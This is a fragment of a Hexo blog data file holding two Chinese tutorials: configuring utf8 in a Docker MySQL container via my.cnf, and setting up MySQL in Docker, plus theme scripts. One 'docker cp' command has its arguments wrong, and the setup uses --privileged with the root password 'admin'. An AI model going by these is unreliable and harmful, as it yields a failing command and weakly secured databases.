sec)\n```","slug":"DockerMySQL-Utf8","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5dn001g7zj3ceao6cui","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>利用Docker搭建的MySQL，如果不进行额外的设置，默认是不支持在表里插入中文字符的，在实际的生产环境中，这是不允许出现的情况，要解决这个问题，主要的一个核心思想是：在容器中的<code>/etc/mysql/conf.d</code>目录下添加文件<code>my.cnf</code>。</p>\n<p>提供以下几种方法：</p>\n<h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><p>如果在生成容器时，使用-v 选项指定了容器和主机之间的配置文件的映射，那么直接在主机相应的目录下直接进行操作即可。</p>\n<span id=\"more\"></span>\n\n<p>比如：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 3306:3306 --privileged=<span class=\"literal\">true</span> -v /docker/mysql/log:/var/log/mysql -v /docker/mysql/data:/var/lib/mysql -v /docker/mysql/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=admin --name mysql-1 mysql:latest </span><br></pre></td></tr></table></figure>\n\n<p>在这个例子中，使用-v 选项将主机&#x2F;docker&#x2F;mysql&#x2F;conf和容器的&#x2F;etc&#x2F;mysql&#x2F;conf.d进行映射，那么直接执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /docker/mysql/conf</span><br><span class=\"line\">vim my.cnf</span><br></pre></td></tr></table></figure>\n\n<p>在文件中插入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[client]</span><br><span class=\"line\">default_character_set = utf8</span><br><span class=\"line\">[mysqld]</span><br><span class=\"line\">collation_server = utf8_general_ci</span><br><span class=\"line\">character_set_server = utf8</span><br></pre></td></tr></table></figure>\n\n<p>保存退出后重启容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker restart mysql-1</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>在生成容器的时候没有进行配置文件目录的映射：</p>\n<ol>\n<li>进入容器：</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it mysql-1 /bin/bash</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>下载软件包vim</li>\n</ol>\n<p>此时，我们的目的是向<code>/etc/mysql/conf.d</code>目录下添加<code>my.cnf</code>配置文件，但是目前容器中并不存在vim软件包，下载软件包可以参考<a href=\"https://nustarain.gitee.io/2023/08/09/ContainerDownloadSoft/\">这篇文章</a>。</p>\n<p>也可以直接执行下面的命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get update</span><br><span class=\"line\">apt install -y vim</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>等待安装完成后</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /etc/mysql/conf.d</span><br><span class=\"line\">vim my.cnf</span><br></pre></td></tr></table></figure>\n\n<p>在文件中插入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[client]</span><br><span class=\"line\">default_character_set = utf8</span><br><span class=\"line\">[mysqld]</span><br><span class=\"line\">collation_server = utf8_general_ci</span><br><span class=\"line\">character_set_server = utf8</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>重启容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker restart mysql-1</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"方法三\"><a href=\"#方法三\" class=\"headerlink\" title=\"方法三\"></a>方法三</h3><ol>\n<li><p>在主机本地编辑文件<code>my.cnf</code>。</p>\n</li>\n<li><p>插入内容：</p>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[client]</span><br><span class=\"line\">default_character_set = utf8</span><br><span class=\"line\">[mysqld]</span><br><span class=\"line\">collation_server = utf8_general_ci</span><br><span class=\"line\">character_set_server = utf8</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>拷贝文件至容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">cp</span> mysql-1 ./my.cnf /etc/mysql/conf.d</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>重启容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker restart mysql-1</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"检查配置文件是否生效\"><a href=\"#检查配置文件是否生效\" class=\"headerlink\" title=\"检查配置文件是否生效\"></a>检查配置文件是否生效</h3><p>进入容器，进入数据库，输入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SHOW VARIABLES LIKE <span class=\"string\">&#x27;character%&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>回车出现以下，修改成功：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SHOW VARIABLES LIKE <span class=\"string\">&#x27;character%&#x27;</span>;</span><br><span class=\"line\">+--------------------------+--------------------------------+</span><br><span class=\"line\">| Variable_name            | Value                          |</span><br><span class=\"line\">+--------------------------+--------------------------------+</span><br><span class=\"line\">| character_set_client     | utf8mb3                        |</span><br><span class=\"line\">| character_set_connection | utf8mb3                        |</span><br><span class=\"line\">| character_set_database   | utf8mb3                        |</span><br><span class=\"line\">| character_set_filesystem | binary                         |</span><br><span class=\"line\">| character_set_results    | utf8mb3                        |</span><br><span class=\"line\">| character_set_server     | utf8mb3                        |</span><br><span class=\"line\">| character_set_system     | utf8mb3                        |</span><br><span class=\"line\">| character_sets_dir       | /usr/share/mysql-8.0/charsets/ |</span><br><span class=\"line\">+--------------------------+--------------------------------+</span><br><span class=\"line\">8 rows <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>利用Docker搭建的MySQL，如果不进行额外的设置，默认是不支持在表里插入中文字符的，在实际的生产环境中，这是不允许出现的情况，要解决这个问题，主要的一个核心思想是：在容器中的<code>/etc/mysql/conf.d</code>目录下添加文件<code>my.cnf</code>。</p>\n<p>提供以下几种方法：</p>\n<h3 id=\"方法一\"><a href=\"#方法一\" class=\"headerlink\" title=\"方法一\"></a>方法一</h3><p>如果在生成容器时，使用-v 选项指定了容器和主机之间的配置文件的映射，那么直接在主机相应的目录下直接进行操作即可。</p>","more":"<p>比如：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 3306:3306 --privileged=<span class=\"literal\">true</span> -v /docker/mysql/log:/var/log/mysql -v /docker/mysql/data:/var/lib/mysql -v /docker/mysql/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=admin --name mysql-1 mysql:latest </span><br></pre></td></tr></table></figure>\n\n<p>在这个例子中，使用-v 选项将主机&#x2F;docker&#x2F;mysql&#x2F;conf和容器的&#x2F;etc&#x2F;mysql&#x2F;conf.d进行映射，那么直接执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /docker/mysql/conf</span><br><span class=\"line\">vim my.cnf</span><br></pre></td></tr></table></figure>\n\n<p>在文件中插入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[client]</span><br><span class=\"line\">default_character_set = utf8</span><br><span class=\"line\">[mysqld]</span><br><span class=\"line\">collation_server = utf8_general_ci</span><br><span class=\"line\">character_set_server = utf8</span><br></pre></td></tr></table></figure>\n\n<p>保存退出后重启容器：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker restart mysql-1</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"方法二\"><a href=\"#方法二\" class=\"headerlink\" title=\"方法二\"></a>方法二</h3><p>在生成容器的时候没有进行配置文件目录的映射：</p>\n<ol>\n<li>进入容器：</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it mysql-1 /bin/bash</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>下载软件包vim</li>\n</ol>\n<p>此时，我们的目的是向<code>/etc/mysql/conf.d</code>目录下添加<code>my.cnf</code>配置文件，但是目前容器中并不存在vim软件包，下载软件包可以参考<a href=\"https://nustarain.gitee.io/2023/08/09/ContainerDownloadSoft/\">这篇文章</a>。</p>\n<p>也可以直接执行下面的命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get update</span><br><span class=\"line\">apt install -y vim</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>等待安装完成后</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /etc/mysql/conf.d</span><br><span class=\"line\">vim my.cnf</span><br></pre></td></tr></table></figure>\n\n<p>在文件中插入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[client]</span><br><span class=\"line\">default_character_set = utf8</span><br><span class=\"line\">[mysqld]</span><br><span class=\"line\">collation_server = utf8_general_ci</span><br><span class=\"line\">character_set_server = utf8</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>重启容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker restart mysql-1</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"方法三\"><a href=\"#方法三\" class=\"headerlink\" title=\"方法三\"></a>方法三</h3><ol>\n<li><p>在主机本地编辑文件<code>my.cnf</code>。</p>\n</li>\n<li><p>插入内容：</p>\n</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[client]</span><br><span class=\"line\">default_character_set = utf8</span><br><span class=\"line\">[mysqld]</span><br><span class=\"line\">collation_server = utf8_general_ci</span><br><span class=\"line\">character_set_server = utf8</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>拷贝文件至容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">cp</span> mysql-1 ./my.cnf /etc/mysql/conf.d</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>重启容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker restart mysql-1</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"检查配置文件是否生效\"><a href=\"#检查配置文件是否生效\" class=\"headerlink\" title=\"检查配置文件是否生效\"></a>检查配置文件是否生效</h3><p>进入容器，进入数据库，输入：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SHOW VARIABLES LIKE <span class=\"string\">&#x27;character%&#x27;</span>;</span><br></pre></td></tr></table></figure>\n\n<p>回车出现以下，修改成功：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SHOW VARIABLES LIKE <span class=\"string\">&#x27;character%&#x27;</span>;</span><br><span class=\"line\">+--------------------------+--------------------------------+</span><br><span class=\"line\">| Variable_name            | Value                          |</span><br><span class=\"line\">+--------------------------+--------------------------------+</span><br><span class=\"line\">| character_set_client     | utf8mb3                        |</span><br><span class=\"line\">| character_set_connection | utf8mb3                        |</span><br><span class=\"line\">| character_set_database   | utf8mb3                        |</span><br><span class=\"line\">| character_set_filesystem | binary                         |</span><br><span class=\"line\">| character_set_results    | utf8mb3                        |</span><br><span class=\"line\">| character_set_server     | utf8mb3                        |</span><br><span class=\"line\">| character_set_system     | utf8mb3                        |</span><br><span class=\"line\">| character_sets_dir       | /usr/share/mysql-8.0/charsets/ |</span><br><span class=\"line\">+--------------------------+--------------------------------+</span><br><span class=\"line\">8 rows <span class=\"keyword\">in</span> <span class=\"built_in\">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>"},{"title":"利用Docker搭建MySQL服务器（实战版）","date":"2023-08-10T06:40:04.000Z","_content":"\n\n\n### 操作步骤\n\n1. 拉取镜像\n\n```bash\ndocker pull mysql\n```\n\n<!-- more -->\n\n2. 生成容器\n\n```bash\ndocker run -d -p 3306:3306 --privileged=true -v /docker/mysql/log:/var/log/mysql -v /docker/mysql/data:/var/lib/mysql -v /docker/mysql/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=admin --name mysql-1 mysql:latest \n```\n\n* -d 后台运行\n\n* -p 端口映射，将本机的3306，映射为容器的3306端口，需要注意的是，如果本机已经装了MySQL，本机3306端口已经被占用的话，需要改变监听的端口。\n\n* -v /docker/mysql/log:/var/log/mysql 数据库服务的日志目录映射\n\n* -v /docker/mysql/data:/var/lib/mysql 数据库服务的数据库数据映射\n\n* -v /docker/mysql/conf:/etc/mysql/conf.d 数据库服务的配置文件映射\n\n* -e 指定数据库服务的密码\n\n* --name 指定容器名称\n\n3. 验证生成\n\n```bash\ndocker ps\n```\n\n4. 进入容器\n\n```bash\ndocker exec -it mysql-1 /bin/bash\n```\n\n5. 进入数据库\n\n```bash\nmysql -u root -padmin\n```\n\n* -p 输入生成容器时设置的密码，-p和密码之间不能有空格","source":"_posts/DockerMySQL.md","raw":"---\ntitle: 利用Docker搭建MySQL服务器（实战版）\ndate: 2023-08-10 14:40:04\ncategories: 学习过程\ntags:\n  - Docker\n  - MySQL\n---\n\n\n\n### 操作步骤\n\n1. 拉取镜像\n\n```bash\ndocker pull mysql\n```\n\n<!-- more -->\n\n2. 生成容器\n\n```bash\ndocker run -d -p 3306:3306 --privileged=true -v /docker/mysql/log:/var/log/mysql -v /docker/mysql/data:/var/lib/mysql -v /docker/mysql/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=admin --name mysql-1 mysql:latest \n```\n\n* -d 后台运行\n\n* -p 端口映射，将本机的3306，映射为容器的3306端口，需要注意的是，如果本机已经装了MySQL，本机3306端口已经被占用的话，需要改变监听的端口。\n\n* -v /docker/mysql/log:/var/log/mysql 数据库服务的日志目录映射\n\n* -v /docker/mysql/data:/var/lib/mysql 数据库服务的数据库数据映射\n\n* -v /docker/mysql/conf:/etc/mysql/conf.d 数据库服务的配置文件映射\n\n* -e 指定数据库服务的密码\n\n* --name 指定容器名称\n\n3. 验证生成\n\n```bash\ndocker ps\n```\n\n4. 进入容器\n\n```bash\ndocker exec -it mysql-1 /bin/bash\n```\n\n5. 进入数据库\n\n```bash\nmysql -u root -padmin\n```\n\n* -p 输入生成容器时设置的密码，-p和密码之间不能有空格","slug":"DockerMySQL","published":1,"updated":"2024-05-03T03:55:54.725Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5do001j7zj3hhdu87ik","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li>拉取镜像</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull mysql</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<ol start=\"2\">\n<li>生成容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 3306:3306 --privileged=<span class=\"literal\">true</span> -v /docker/mysql/log:/var/log/mysql -v /docker/mysql/data:/var/lib/mysql -v /docker/mysql/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=admin --name mysql-1 mysql:latest </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>-d 后台运行</p>\n</li>\n<li><p>-p 端口映射，将本机的3306，映射为容器的3306端口，需要注意的是，如果本机已经装了MySQL，本机3306端口已经被占用的话，需要改变监听的端口。</p>\n</li>\n<li><p>-v &#x2F;docker&#x2F;mysql&#x2F;log:&#x2F;var&#x2F;log&#x2F;mysql 数据库服务的日志目录映射</p>\n</li>\n<li><p>-v &#x2F;docker&#x2F;mysql&#x2F;data:&#x2F;var&#x2F;lib&#x2F;mysql 数据库服务的数据库数据映射</p>\n</li>\n<li><p>-v &#x2F;docker&#x2F;mysql&#x2F;conf:&#x2F;etc&#x2F;mysql&#x2F;conf.d 数据库服务的配置文件映射</p>\n</li>\n<li><p>-e 指定数据库服务的密码</p>\n</li>\n<li><p>–name 指定容器名称</p>\n</li>\n</ul>\n<ol start=\"3\">\n<li>验证生成</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker ps</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>进入容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"built_in\">exec</span> -it mysql-1 /bin/bash</span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>进入数据库</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -u root -padmin</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>-p 输入生成容器时设置的密码，-p和密码之间不能有空格</li>\n</ul>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"操作步骤\"><a href=\"#操作步骤\" class=\"headerlink\" title=\"操作步骤\"></a>操作步骤</h3><ol>\n<li>拉取镜像</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull mysql</span><br></pre></td></tr></table></figure>","more":"<ol start=\"2\">\n<li>生成容器</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -d -p 3306:3306 --privileged=<span class=\"literal\">true</span> -v /docker/mysql/log:/var/log/mysql -v /docker/mysql/data:/var/lib/mysql -v /docker/mysql/conf:/etc/mysql/conf.d -e MYSQL_ROOT_PASSWORD=admin --name mysql-1 mysql:latest 